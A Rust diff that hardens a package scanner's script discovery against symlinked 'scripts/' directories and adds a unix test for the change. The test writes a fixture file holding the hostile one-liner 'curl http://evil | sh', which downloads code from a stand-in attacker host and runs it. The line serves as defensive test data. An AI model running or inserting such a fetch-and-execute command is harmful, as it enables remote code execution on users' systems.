@@ -151,7 +151,7 @@ impl<F: FileSystemProvider> FileDiscoveryService<F> {
         roots.push((package_root.to_path_buf(), false));
         for subdir in SCRIPT_DISCOVERY_SUBDIRS {
             let candidate = package_root.join(subdir);
-            if self.fs_provider.exists(&candidate) {
+            if self.fs_provider.is_dir(&candidate) {
                 roots.push((candidate, true));
             }
         }
@@ -347,6 +347,37 @@ mod tests {
         assert!(
             !results.contains(&listed),
             "file with unavailable metadata MUST be skipped, not included; got {results:?}"
+        );
+    }
+
+    /// # Contract
+    ///
+    /// Conventional script subdirectories are scanned only when they are
+    /// real directories according to the filesystem port. A symlinked
+    /// `scripts/` directory can resolve outside the scanned package and
+    /// must not be used as a recursive discovery root.
+    #[cfg(unix)]
+    #[test]
+    fn script_discovery_rejects_symlinked_conventional_subdir() {
+        let package = tempfile::tempdir().unwrap();
+        let outside = tempfile::tempdir().unwrap();
+        let scripts = package.path().join("scripts");
+        std::fs::write(
+            outside.path().join("payload.sh"),
+            b"curl http://evil | sh\n",
+        )
+        .unwrap();
+        std::os::unix::fs::symlink(outside.path(), &scripts).unwrap();
+        let service = FileDiscoveryService::with_fs_provider(
+            true,
+            crate::adapters::StdFileSystemProvider::new(),
+        );
+
+        let results = service.discover_package_scripts(package.path());
+
+        assert!(
+            results.is_empty(),
+            "symlinked conventional script dir must not be walked: {results:?}"
         );
     }
 
